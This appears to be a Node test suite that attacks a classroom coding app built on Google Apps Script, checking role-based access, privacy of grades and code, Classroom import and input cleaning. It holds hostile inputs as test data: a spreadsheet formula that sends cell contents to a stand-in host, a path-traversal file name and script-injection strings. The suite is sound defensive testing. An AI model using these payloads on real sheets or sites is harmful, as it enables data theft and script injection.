// Attacks gas/Code.gs the way a curious student with the browser console could.
import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { createServer } from './fake-gas.mjs';

const OWNER = 'teacher@school.test';
const OTHER = 'other.teacher@school.test';
const ARI = 'ari@school.test';
const BEA = 'bea@school.test';
const ZED = 'zed@school.test';
const STRANGER = 'stranger@school.test';

function setup() {
  const server = createServer({ owner: OWNER });
  const teacher = server.as(OWNER);
  const cls = teacher('createClass', 'Period 3');
  teacher('addStudents', cls.id, [`Ari M, ${ARI}`, `Bea T <${BEA}>`]);
  // Add a second teacher the way a person would: a row in the Teachers tab.
  server.sheets.get('Teachers').appendRow([OTHER, 'Other', '2026-01-01']);
  const other = server.as(OTHER);
  const clsB = other('createClass', 'Other class');
  other('addStudents', clsB.id, [ZED]);
  const ari = server.as(ARI);
  const bea = server.as(BEA);
  const zed = server.as(ZED);
  const ids = Object.fromEntries(teacher('listStudents', cls.id).map((s) => [s.username, s.id]));
  ari('saveWork', 't1', { code: 'ARI SECRET CODE', assets: {} });
  const beaWork = bea('submitWork', 't1', { code: 'BEA CODE', assets: {}, reflection: 'BEA REFLECTION', auto_ok: true });
  teacher('saveGrade', beaWork.id, { scores: { works: 4 }, total: 4, max_total: 12, feedback: 'PRIVATE FEEDBACK', status: 'approved' });
  return { server, teacher, other, ari, bea, zed, cls, clsB, ids, beaWork };
}
const denied = (fn) => assert.throws(fn);

test('only the two entry points can be called from a browser', () => {
  const { server } = setup();
  assert.deepEqual(server.publicFunctions().sort(), ['api', 'dailyProgressEmail', 'doGet']);
});

test('someone on no roster gets no access and no data', () => {
  const { server, cls } = setup();
  assert.equal(server.as(STRANGER)('session').role, null);
  for (const m of ['classBoard', 'myWorks', 'listClasses', 'arcade']) denied(() => server.as(STRANGER)(m, cls.id));
});

test('a signed-out request gets nothing', () => {
  const { server, cls } = setup();
  assert.equal(server.as('')('session').role, null);
  denied(() => server.as('')('classBoard', cls.id));
});

test('the deploying teacher becomes a teacher automatically, and email case does not matter', () => {
  const { server } = setup();
  assert.equal(server.as('TEACHER@school.test')('session').role, 'teacher');
  assert.equal(server.as('ARI@SCHOOL.TEST')('session').role, 'student');
});

test('a student cannot use any teacher action', () => {
  const { ari, cls, ids, beaWork } = setup();
  denied(() => ari('listClasses'));
  denied(() => ari('listStudents', cls.id));
  denied(() => ari('classWork', cls.id));
  denied(() => ari('getWorkFull', beaWork.id));
  denied(() => ari('saveGrade', beaWork.id, { status: 'approved' }));
  denied(() => ari('giveAward', ids[ARI], 'helper', ''));
  denied(() => ari('addStudents', cls.id, ['x@school.test']));
  denied(() => ari('removeStudent', ids[BEA]));
  denied(() => ari('setStudentPath', ids[ARI], 'arcade'));
  denied(() => ari('teacherUnshare', beaWork.id));
});

test('a student only ever receives their own code and grades', () => {
  const { ari, bea } = setup();
  const mine = ari('myWorks');
  assert.equal(mine.length, 1);
  assert.equal(mine[0].code, 'ARI SECRET CODE');
  assert.equal(mine[0].grade, null);
  assert.equal(bea('myWorks')[0].grade.feedback, 'PRIVATE FEEDBACK');
});

test('the class board shows progress but no code, grades, reflections, or emails', () => {
  const { ari, cls } = setup();
  const text = JSON.stringify(ari('classBoard', cls.id));
  for (const secret of ['BEA CODE', 'ARI SECRET', 'PRIVATE FEEDBACK', 'BEA REFLECTION', '@school.test']) assert.ok(!text.includes(secret), secret);
  assert.ok(text.includes('Bea T'));
});

test('a student cannot see another class', () => {
  const { zed, cls } = setup();
  denied(() => zed('classBoard', cls.id));
  denied(() => zed('arcade', cls.id));
  denied(() => zed('listSprites', cls.id));
});

test('a teacher cannot see or change another teacher\'s class', () => {
  const { other, cls, ids, beaWork } = setup();
  denied(() => other('getClass', cls.id));
  denied(() => other('listStudents', cls.id));
  denied(() => other('classBoard', cls.id));
  denied(() => other('classWork', cls.id));
  denied(() => other('getWorkFull', beaWork.id));
  denied(() => other('saveGrade', beaWork.id, { status: 'approved' }));
  denied(() => other('removeStudent', ids[ARI]));
  denied(() => other('deleteClass', cls.id));
  denied(() => other('addStudents', cls.id, ['x@school.test']));
  denied(() => other('giveAward', ids[ARI], 'helper', ''));
  assert.equal(other('listClasses').length, 1);
});

test('a student cannot approve their own work or forge fields', () => {
  const { ari, teacher, cls } = setup();
  const w = ari('saveWork', 't2', { code: 'x', assets: {}, status: 'approved', shared: true, student_id: 'someone-else', stretch_done: 99 });
  assert.equal(w.status, 'in_progress');
  assert.equal(w.shared, false);
  assert.equal(w.stretch_done, 3);
  const all = teacher('classWork', cls.id).filter((x) => x.lesson_id === 't2');
  assert.equal(all.length, 1);
  assert.notEqual(all[0].student_id, 'someone-else');
});

test('approved work is locked, and returned work can be fixed and resubmitted', () => {
  const { bea, teacher, beaWork } = setup();
  denied(() => bea('saveWork', 't1', { code: 'changed' }));
  denied(() => bea('submitWork', 't1', { code: 'changed' }));
  teacher('saveGrade', beaWork.id, { scores: {}, total: 1, max_total: 12, feedback: 'Fix it', status: 'returned' });
  assert.equal(bea('saveWork', 't1', { code: 'fixed', assets: {} }).status, 'returned');
  assert.equal(bea('submitWork', 't1', { code: 'fixed', assets: {} }).status, 'submitted');
});

test('a student can change their look but not their name, and picks a road only once', () => {
  const { ari, teacher, cls, ids } = setup();
  const s = ari('updateProfile', { avatar: { hat: 'cap' }, display_name: 'Hacker', class_id: 'x', email: 'bea@school.test', path: 'arcade', game_name: 'Mine' });
  assert.equal(s.display_name, 'Ari M');
  assert.equal(s.class_id, cls.id);
  assert.equal(s.avatar.hat, 'cap');
  assert.equal(ari('session').student.username, ARI);
  denied(() => ari('updateProfile', { path: 'platformer' }));
  denied(() => ari('updateProfile', { avatar: { junk: 'x'.repeat(3000) } }));
  teacher('setStudentPath', ids[ARI], 'platformer');
  assert.equal(ari('session').student.path, 'platformer');
});

test('nobody can inject a formula into the Sheet', () => {
  const { ari, teacher, cls } = setup();
  const formula = '=IMPORTXML("https://evil.test/?"&A1,"//a")';
  const w = ari('saveWork', 't3', { code: formula, assets: {}, reflection: formula });
  ari('updateProfile', { game_name: formula });
  teacher('addStudents', cls.id, [`=HYPERLINK("x"), new@school.test`]);
  teacher('createClass', formula);
  assert.equal(ari('myWorks').find((x) => x.id === w.id).reflection, formula);
  assert.equal(ari('session').student.game_name, formula);
});

test('long programs survive the 50,000 character cell limit, intact', () => {
  const { ari } = setup();
  const code = `// ${'x'.repeat(120000)}\n=weird`;
  ari('saveWork', 't4', { code, assets: { hero: 'data:image/png;base64,AAAA' } });
  const w = ari('myWorks').find((x) => x.lesson_id === 't4');
  assert.equal(w.code, code);
  assert.equal(w.assets.hero, 'data:image/png;base64,AAAA');
  denied(() => ari('saveWork', 't5', { code: 'x'.repeat(600000) }));
});

test('projects can hold extra code files, with safe names only', () => {
  const { ari, bea, cls, teacher } = setup();
  const files = { 'helpers.js': 'function hi() {}', 'sketch.js': 'x', '../evil.js': 'x', 'a b.js': 'x', 'notes.txt': 'x' };
  const saved = ari('saveWork', 't2', { code: 'hi();', assets: {}, files });
  assert.deepEqual(saved.files, { 'helpers.js': 'function hi() {}' });
  assert.equal(ari('myWorks').find((w) => w.lesson_id === 't2').files['helpers.js'], 'function hi() {}');
  const w = teacher('classWork', cls.id).find((x) => x.lesson_id === 't2');
  assert.equal(teacher('getWorkFull', w.id).files['helpers.js'], 'function hi() {}');
  ari('setShared', 't2', true);
  assert.equal(bea('arcade', cls.id).find((g) => g.lesson_id === 't2').files['helpers.js'], 'function hi() {}');
  const many = Object.fromEntries(Array.from({ length: 12 }, (_, i) => [`f${i}.js`, 'x']));
  assert.equal(Object.keys(ari('saveWork', 't3', { code: '', assets: {}, files: many }).files).length, 8);
});

test('special characters and quotes come back exactly', () => {
  const { ari } = setup();
  const code = 'text("héllo \\"é\\" 🎮", 1, 2);\n\t~tilde\n+plus\n@at';
  ari('saveWork', 't6', { code, assets: {}, reflection: '~leading tilde' });
  const w = ari('myWorks').find((x) => x.lesson_id === 't6');
  assert.equal(w.code, code);
  assert.equal(w.reflection, '~leading tilde');
});

test('reading the board does not load stored code', () => {
  const { server, ari, cls } = setup();
  ari('saveWork', 't2', { code: 'y'.repeat(100000), assets: {} });
  const works = server.sheets.get('Works');
  const orig = works.getRange.bind(works);
  let widest = 0;
  works.getRange = (r, c, nr, nc) => { widest = Math.max(widest, nc || 1); return orig(r, c, nr, nc); };
  ari('classBoard', cls.id);
  assert.ok(widest <= 14, `read ${widest} columns`);
});

test('a daily plan is the teacher\'s alone, and bad input is cleaned', () => {
  const { teacher, other, ari, cls } = setup();
  denied(() => ari('getClassPlan', cls.id));
  denied(() => ari('saveClassPlan', cls.id, { question: 'x' }));
  denied(() => other('getClassPlan', cls.id));
  denied(() => other('saveClassPlan', cls.id, { question: 'x' }));
  const saved = teacher('saveClassPlan', cls.id, { day: '2026-11-08', question: `=BAD()${'x'.repeat(400)}`, focus: 'Keep going', standards: ['6-8.CT.b.5', 'junk', '<b>'], timer_end: 'not a date' });
  assert.equal(saved.question.length, 200);
  assert.deepEqual(saved.standards, ['6-8.CT.b.5']);
  assert.equal(saved.timer_end, '');
  teacher('saveClassPlan', cls.id, { day: '2026-11-08', question: 'Second', timer_end: '2026-11-08T15:00:00Z' });
  const plan = teacher('getClassPlan', cls.id);
  assert.equal(plan.question, 'Second');
  assert.equal(plan.timer_end, '2026-11-08T15:00:00.000Z');
});

test('the class board gives dates for achievements, and still no private details', () => {
  const { ari, cls } = setup();
  const b = ari('classBoard', cls.id).find((s) => s.display_name === 'Bea T');
  assert.ok(b.works[0].submitted_at);
  assert.ok(!JSON.stringify(b).includes('PRIVATE FEEDBACK'));
});

const person = (id, name, email) => ({ userId: id, profile: { name: { fullName: name }, emailAddress: email } });
const classroomData = () => ({
  courses: [{ id: 'c1', name: 'Game Design', section: 'P3' }, { id: 'c2', name: 'Robotics' }, { id: 'c3', name: 'Art' }],
  rosters: {
    c1: [person('g1', 'Ava Marie Lopez', 'ava@school.test'), person('g2', 'Ben Tran', 'ben@school.test'), person('g3', 'Cy', 'cy@school.test'), person('g4', 'No Email', '')],
    c2: [person('g2', 'Ben Tran', 'ben@school.test'), person('g5', 'Dee Fox', 'dee@school.test')],
  },
  work: { c1: [{ id: 'w1', title: 'Essay', alternateLink: 'https://cr/w1', dueDate: { year: 2020, month: 1, day: 1 } }, { id: 'w2', title: 'Quiz', alternateLink: 'https://cr/w2', dueDate: { year: 2099, month: 1, day: 1 } }, { id: 'w3', title: 'Poster', alternateLink: 'https://cr/w3' }] },
  subs: { c1: [
    { userId: 'g1', courseWorkId: 'w1', state: 'CREATED' }, { userId: 'g1', courseWorkId: 'w2', state: 'CREATED' }, { userId: 'g1', courseWorkId: 'w3', state: 'TURNED_IN', late: true },
    { userId: 'g2', courseWorkId: 'w1', state: 'RETURNED', assignedGrade: 9 }, { userId: 'g2', courseWorkId: 'w3', state: 'TURNED_IN' },
    { userId: 'stranger', courseWorkId: 'w1', state: 'CREATED' },
  ] },
});

function classroomSetup() {
  const server = createServer({ owner: OWNER, classroom: classroomData() });
  const t = server.as(OWNER);
  t('listClasses');
  server.sheets.get('Teachers').appendRow([OTHER, 'Other', '2026-01-01']);
  const [r] = t('importCourses', ['c1']);
  return { server, t, r, cid: r.class_id };
}

test('importing brings in a course across pages, with last initials only', () => {
  const { t, r, cid } = classroomSetup();
  assert.equal(r.added, 3);
  assert.equal(r.skipped.length, 1);
  const names = t('listStudents', cid).map((s) => s.display_name).sort();
  assert.deepEqual(names, ['Ava L', 'Ben T', 'Cy']);
  assert.ok(!JSON.stringify(t('classBoard', cid)).includes('Lopez'));
  assert.equal(t('listGoogleCourses').find((c) => c.id === 'c1').linked, true);
  assert.equal(t('listGoogleCourses').length, 3);
});

test('importing again adds only new students, and reports who left without removing them', () => {
  const data = classroomData();
  const server = createServer({ owner: OWNER, classroom: data });
  const t = server.as(OWNER);
  const [first] = t('importCourses', ['c1']);
  data.rosters.c1 = data.rosters.c1.filter((p) => p.userId !== 'g3').concat(person('g9', 'New Kid', 'new@school.test'));
  const [again] = t('importCourses', ['c1']);
  assert.equal(again.class_id, first.class_id);
  assert.equal(again.added, 1);
  assert.equal(again.matched, 2);
  assert.equal(again.gone, 1);
  assert.equal(t('listStudents', first.class_id).length, 4);
  assert.equal(t('listClasses').length, 1);
});

test('a student in two courses is reported, not duplicated', () => {
  const { t } = classroomSetup();
  const [r] = t('importCourses', ['c2']);
  assert.equal(r.added, 1);
  assert.ok(r.skipped.some((x) => x.includes('already in another class')));
});

test('only the deploying teacher can reach Google Classroom', () => {
  const { server, cid } = classroomSetup();
  const other = server.as(OTHER);
  const student = server.as('ava@school.test');
  denied(() => other('listGoogleCourses'));
  denied(() => other('importCourses', ['c1']));
  denied(() => other('classroomWork', cid));
  denied(() => other('setDigest', true));
  denied(() => other('classAlerts', cid));
  denied(() => student('listGoogleCourses'));
  denied(() => student('importCourses', ['c1']));
  denied(() => student('classroomWork', cid));
  denied(() => student('classAlerts', cid));
  denied(() => student('getPace', cid));
  denied(() => student('savePace', cid, {}));
  denied(() => server.as(OWNER)('importCourses', ['not-mine']));
});

test('assignments show each student\'s status, across pages', () => {
  const { t, cid } = classroomSetup();
  const data = t('classroomWork', cid);
  assert.equal(data.assignments.length, 3);
  const ava = data.students.find((s) => s.display_name === 'Ava L');
  assert.equal(ava.cells.w1.state, 'missing');
  assert.equal(ava.cells.w2.state, 'assigned');
  assert.equal(ava.cells.w3.state, 'late');
  assert.equal(ava.missing, 1);
  const ben = data.students.find((s) => s.display_name === 'Ben T');
  assert.equal(ben.cells.w1.state, 'graded');
  assert.equal(ben.cells.w1.grade, 9);
  assert.equal(ben.cells.w3.state, 'done');
});

test('alerts include Classroom work, and an email goes only to the deploying teacher', () => {
  const { server, t, cid } = classroomSetup();
  const yearAgo = new Date(Date.now() - 86400000 * 100).toISOString().slice(0, 10);
  const soon = new Date(Date.now() + 86400000 * 5).toISOString().slice(0, 10);
  t('savePace', cid, { term_start: yearAgo, term_end: soon });
  const a = t('classAlerts', cid, true).students.find((s) => s.display_name === 'Ava L');
  assert.equal(a.level, 'behind');
  assert.ok(a.reasons.some((r) => r.includes('missing in Classroom')));
  denied(() => server.run('ava@school.test', 'dailyProgressEmail'));
  assert.equal(server.mail.length, 0);
  const day = new Date().getDay();
  server.run(OWNER, 'dailyProgressEmail');
  server.run(OWNER, 'dailyProgressEmail');
  if (day !== 0 && day !== 6) {
    assert.equal(server.mail.length, 1, 'one email per day');
    assert.equal(server.mail[0].to, OWNER);
    assert.ok(server.mail[0].body.includes('Ava L'));
    assert.ok(!server.mail[0].body.includes('Lopez'));
  }
  t('setDigest', true);
  t('setDigest', true);
  assert.equal(server.triggers.length, 1);
  assert.equal(t('getDigest').on, true);
  t('setDigest', false);
  assert.equal(t('getDigest').on, false);
});

test('pace dates are checked', () => {
  const { t, cid } = classroomSetup();
  t('savePace', cid, { term_start: '<b>', term_end: '2026-12-20' });
  assert.deepEqual(t('getPace', cid), { term_start: '', term_end: '2026-12-20' });
});

test('sharing is visible inside the class only, and a teacher can take it down', () => {
  const { ari, bea, zed, teacher, cls } = setup();
  ari('setShared', 't1', true);
  const games = bea('arcade', cls.id);
  assert.equal(games.length, 1);
  assert.equal(games[0].code, 'ARI SECRET CODE');
  assert.equal(games[0].student.display_name, 'Ari M');
  assert.ok(!JSON.stringify(games).includes('@school.test'));
  denied(() => zed('arcade', cls.id));
  teacher('teacherUnshare', games[0].id);
  assert.equal(bea('arcade', cls.id).length, 0);
});

function teamSetup() {
  const s = setup();
  const named = (n) => s.teacher('listStudents', s.cls.id).find((x) => x.display_name.startsWith(n)).id;
  return { ...s, ariId: named('Ari'), beaId: named('Bea') };
}

test('groups: 2 or 3 from one class, set only by the teacher', () => {
  const { teacher, other, ari, cls, ariId, beaId } = teamSetup();
  denied(() => teacher('saveTeams', cls.id, 'c6', [[ariId]]));
  denied(() => teacher('saveTeams', cls.id, 'c6', [[ariId, ariId]]));
  denied(() => teacher('saveTeams', cls.id, 'c6', [[ariId, 'someone-else']]));
  denied(() => ari('saveTeams', cls.id, 'c6', [[ariId, beaId]]));
  denied(() => other('saveTeams', cls.id, 'c6', [[ariId, beaId]]));
  denied(() => ari('listTeams', cls.id));
  denied(() => other('listTeams', cls.id));
  denied(() => teacher('saveTeams', cls.id, 'p1', [[ariId, beaId]]));
  teacher('saveTeams', cls.id, 'c6', [[ariId, beaId]]);
  assert.equal(teacher('listTeams', cls.id).length, 1);
});

test('groups: one keyboard at a time, shared code, and each line credited to who typed it', () => {
  const { teacher, ari, bea, zed, cls, ariId, beaId } = teamSetup();
  teacher('saveTeams', cls.id, 'c6', [[ariId, beaId]]);
  assert.equal(zed('teamFor', 'c6', null, {}), null);
  denied(() => zed('takeKeyboard', 'c6', null));

  ari('takeKeyboard', 'c6', { code: 'starter();', assets: {}, files: {} });
  denied(() => bea('takeKeyboard', 'c6', null));

  ari('saveWork', 'c6', { code: 'starter();\nariLine();\nariTwo();', assets: {}, files: {} });
  assert.match(bea('teamFor', 'c6', null, {}).doc.code, /ariTwo/);

  // Someone not at the keyboard can't change the code, and can't get credit for it.
  const blocked = bea('saveWork', 'c6', { code: 'beaTakesOver();', assets: {}, files: {}, reflection: 'mine' });
  assert.equal(blocked.team_lost, true);
  assert.match(blocked.code, /ariLine/);
  assert.equal(blocked.reflection, 'mine');

  ari('passKeyboard', 'c6');
  bea('takeKeyboard', 'c6', null);
  bea('saveWork', 'c6', { code: 'starter();\nariLine();\nbeaLine();', assets: {}, files: {} });

  const [team] = teacher('listTeams', cls.id);
  const stats = (id) => team.members.find((m) => m.id === id);
  assert.equal(team.starter_lines, 1, 'starter code is nobody\'s contribution');
  assert.equal(stats(ariId).lines, 1);
  assert.equal(stats(beaId).lines, 1);
  assert.equal(stats(ariId).added, 2);
  assert.equal(stats(beaId).removed, 1);

  // Contribution records are for the teacher, and each student reports for themselves.
  denied(() => bea('submitWork', 'c6', { reflection: 'done' }));
  bea('submitWork', 'c6', { reflection: 'done', contribution: 'I fixed the ending.' });
  assert.equal(JSON.stringify(ari('teamFor', 'c6', null, {})).includes('fixed the ending'), false);
  assert.equal(teacher('listTeams', cls.id)[0].members.find((m) => m.id === beaId).note, 'I fixed the ending.');
});

test('a group grade can go to teammates who submitted, and only them', () => {
  const { teacher, ari, bea, cls, ariId, beaId } = teamSetup();
  teacher('saveTeams', cls.id, 'c6', [[ariId, beaId]]);
  ari('takeKeyboard', 'c6', { code: 'x();', assets: {}, files: {} });
  const a = ari('submitWork', 'c6', { code: 'x();\ny();', assets: {}, files: {}, contribution: 'I typed.' });
  teacher('saveGrade', a.id, { scores: {}, total: 10, max_total: 12, feedback: '', status: 'approved', to_team: true });
  const works = teacher('classWork', cls.id).filter((w) => w.lesson_id === 'c6');
  assert.equal(works.find((w) => w.student_id === ariId).status, 'approved');
  assert.notEqual(works.find((w) => w.student_id === beaId)?.status, 'approved');
  bea('submitWork', 'c6', { contribution: 'I tested.' });
  const b = teacher('classWork', cls.id).find((w) => w.lesson_id === 'c6' && w.student_id === beaId);
  teacher('saveGrade', b.id, { scores: {}, total: 9, max_total: 12, feedback: '', status: 'approved' });
  assert.equal(teacher('classWork', cls.id).find((w) => w.id === b.id).grade.total, 9, 'students can get different grades');
});

test('grades go only to an assignment this app created, with both grade fields', () => {
  const data = classroomData();
  const server = createServer({ owner: OWNER, classroom: data });
  const t = server.as(OWNER);
  t('listClasses');
  server.sheets.get('Teachers').appendRow([OTHER, 'Other', '2026-01-01']);
  const [r] = t('importCourses', ['c1']);
  data.madeSubs = { c1: [{ id: 'sub1', userId: 'g1', courseWorkId: 'made-1' }] };
  const s = server.as('ava@school.test');
  denied(() => t('pushGrades', r.class_id, 't1', { title: 'Hello', due: '2030-01-15' }));
  const w = s('submitWork', 't1', { code: 'a', assets: {} });
  t('saveGrade', w.id, { scores: {}, total: 11, max_total: 12, feedback: 'SECRET', status: 'approved' });

  denied(() => s('pushGrades', r.class_id, 't1', { title: 'Hello', due: '2030-01-15' }));
  denied(() => server.as(OTHER)('pushGrades', r.class_id, 't1', { title: 'Hello', due: '2030-01-15' }));
  denied(() => t('pushGrades', r.class_id, 't1', { title: 'Hello', due: 'soon' }));

  assert.equal(t('gradeSyncStatus', r.class_id).items[0].waiting, 1);
  const out = t('pushGrades', r.class_id, 't1', { title: 'Hello', due: '2030-01-15' });
  assert.equal(out.sent, 1);
  assert.equal(data.created.length, 1);
  assert.equal(data.created[0].state, 'PUBLISHED');
  assert.equal(data.created[0].maxPoints, 12);
  assert.ok(data.created[0].dueDate && data.created[0].dueTime, 'PowerSchool needs a due date');
  assert.deepEqual(data.patched[0], { courseId: 'c1', workId: 'made-1', subId: 'sub1', draftGrade: 11, assignedGrade: 11 });
  assert.equal(JSON.stringify(data.created).includes('SECRET'), false, 'feedback stays private');
  assert.equal(t('gradeSyncStatus', r.class_id).items[0].waiting, 0);

  // Sending again updates the same assignment rather than making a second one.
  t('saveGrade', w.id, { scores: {}, total: 12, max_total: 12, feedback: '', status: 'approved' });
  assert.equal(t('gradeSyncStatus', r.class_id).items[0].waiting, 1);
  t('pushGrades', r.class_id, 't1', { title: 'Hello', due: '2030-01-15' });
  assert.equal(data.created.length, 1);
  assert.equal(data.patched[1].assignedGrade, 12);
});

test('song rules: only real notes, owner edits, class sees published, teacher can remove', () => {
  const { ari: lyra, bea: milo, zed, teacher, cls } = setup();
  const data = JSON.stringify({ tempo: 120, scale: 'bright', lead: 'C5 . E5', bass: '', drums: 'k . s' });
  denied(() => lyra('saveSong', { name: 'bad', data: JSON.stringify({ lead: '";alert(1);//' }) }));
  denied(() => lyra('saveSong', { name: 'bad', data: 'not json' }));
  const s = lyra('saveSong', { name: 'theme', data, published: false });
  assert.equal(milo('listSongs', cls.id).length, 0);
  lyra('saveSong', { ...s, published: true });
  assert.equal(JSON.parse(milo('listSongs', cls.id)[0].data).lead, 'C5 . E5');
  denied(() => milo('saveSong', { ...s, name: 'stolen' }));
  denied(() => milo('deleteSong', s.id));
  denied(() => zed('listSongs', cls.id));
  teacher('deleteSong', s.id);
  assert.equal(lyra('mySongs').length, 0);
});

test('sprite rules: must be an image, owner edits, class sees published, teacher can remove', () => {
  const { ari, bea, zed, teacher, cls } = setup();
  const png = 'data:image/png;base64,AAAA';
  denied(() => ari('saveSprite', { name: 'bad', data_url: 'javascript:alert(1)' }));
  const s = ari('saveSprite', { name: 'hero', data_url: png, frames: 2, w: 16, h: 16, published: false });
  assert.equal(bea('listSprites', cls.id).length, 0);
  ari('saveSprite', { ...s, published: true });
  assert.equal(bea('listSprites', cls.id)[0].data_url, png);
  assert.equal(zed('mySprites').length, 0);
  denied(() => bea('saveSprite', { ...s, name: 'stolen' }));
  denied(() => bea('deleteSprite', s.id));
  const forged = bea('saveSprite', { name: 'mine', data_url: png, class_id: 'other', student_id: 'x', teacher_email: OWNER });
  assert.equal(forged.student_id, teacher('classBoard', cls.id).find((b) => b.display_name === 'Bea T').id);
  assert.equal(forged.class_id, cls.id);
  teacher('deleteSprite', s.id);
  assert.equal(ari('mySprites').length, 0);
});

test('rosters reject bad lines and duplicates without adding anyone', () => {
  const { teacher, cls } = setup();
  const before = teacher('listStudents', cls.id).length;
  denied(() => teacher('addStudents', cls.id, ['new1@school.test', 'no email here']));
  denied(() => teacher('addStudents', cls.id, ['new1@school.test', ARI]));
  denied(() => teacher('addStudents', cls.id, ['new1@school.test', 'NEW1@school.test']));
  denied(() => teacher('addStudents', cls.id, [OWNER]));
  assert.equal(teacher('listStudents', cls.id).length, before);
  teacher('addStudents', cls.id, ['Cam R\tcam@school.test', 'dee@school.test']);
  const names = teacher('listStudents', cls.id).map((s) => s.display_name);
  assert.ok(names.includes('Cam R') && names.includes('dee'));
});

test('removing a student deletes everything of theirs and ends their access', () => {
  const { server, ari, bea, teacher, cls, ids } = setup();
  ari('saveSprite', { name: 'h', data_url: 'data:image/png;base64,AA', published: true });
  teacher('giveAward', ids[ARI], 'helper', 'nice');
  teacher('removeStudent', ids[ARI]);
  assert.equal(server.as(ARI)('session').role, null);
  assert.equal(bea('listSprites', cls.id).length, 0);
  assert.ok(!teacher('classWork', cls.id).some((w) => w.student_id === ids[ARI]));
  assert.equal(server.sheets.get('Awards').getLastRow(), 1);
});

test('deleting a class removes its data, and leaves other classes alone', () => {
  const { server, teacher, other, zed, cls, clsB } = setup();
  zed('saveWork', 't1', { code: 'ZED', assets: {} });
  teacher('deleteClass', cls.id);
  assert.equal(server.as(ARI)('session').role, null);
  assert.equal(server.sheets.get('Grades').getLastRow(), 1);
  assert.equal(zed('myWorks')[0].code, 'ZED');
  assert.equal(other('listStudents', clsB.id).length, 1);
});

test('it also works as a standalone script, creating its own Sheet once', () => {
  const server = createServer({ owner: OWNER, bound: false });
  const t = server.as(OWNER);
  t('createClass', 'A');
  t('createClass', 'B');
  assert.equal(server.createdCount(), 1);
  assert.equal(t('listClasses').length, 2);
});

test('the built files load the way Apps Script loads them', () => {
  const server = createServer({ owner: OWNER, codeFile: '../dist/Code.gs', htmlDir: '../dist' });
  for (const name of ['Styles', 'P5', 'App']) assert.ok(server.run(OWNER, 'include_', name).length > 1000, name);
  const teacher = server.as(OWNER);
  const cls = teacher('createClass', 'P');
  teacher('addStudents', cls.id, [`Ari M, ${ARI}`]);
  const ari = server.as(ARI);
  let ml5 = '';
  for (let i = 0; ; i++) { const part = ari('libraryPart', i); if (!part) break; ml5 += part; }
  const original = readFileSync(new URL('../vendor/ml5.min.js', import.meta.url), 'utf8');
  assert.equal(ml5, original.replace(/<\/script/gi, '<\\/script').replace(/<!--/g, '<\\!--'));
});

test('Apps Script gets no large inline JavaScript to rewrite', () => {
  // Apps Script rewrites inline scripts and broke the bundle that way, so real code ships as base64.
  for (const f of ['Index', 'Styles', 'P5', 'App']) {
    const html = readFileSync(new URL(`../dist/${f}.html`, import.meta.url), 'utf8');
    for (const [, attrs, body] of html.matchAll(/<script([^>]*)>([\s\S]*?)<\/script>/g)) {
      if (/text\/plain/.test(attrs)) {
        if (/base64/.test(attrs)) assert.match(body, /^[A-Za-z0-9+/=\s]*$/, `${f}: base64 block`);
        continue;
      }
      assert.ok(body.length < 4000, `${f}: inline script of ${body.length} characters`);
      assert.doesNotMatch(body, /`/, `${f}: template literal in an inline script`);
    }
  }
});

test('a batch follows the same access rules as single calls', () => {
  const { server, cls, ids } = setup();
  const r = server.raw(ARI, 'batch', [[['myWorks', []], ['classWork', [cls.id]], ['getWorkFull', [ids.bea]], ['batch', [[]]], ['session', []]]]);
  assert.equal(r.ok, true);
  const [mine, classWork, other, nested, session] = r.data;
  assert.equal(mine.ok, true);
  assert.equal(classWork.ok, false);
  assert.equal(other.ok, false);
  assert.equal(nested.ok, false);
  assert.equal(session.data.role, 'student');
  assert.equal(server.raw(ARI, 'batch', [Array.from({ length: 13 }, () => ['myWorks', []])]).ok, false);
  assert.equal(server.raw(STRANGER, 'batch', [[['myWorks', []]]]).data[0].ok, false);
  assert.ok(!JSON.stringify(r).includes('BEA'));
});
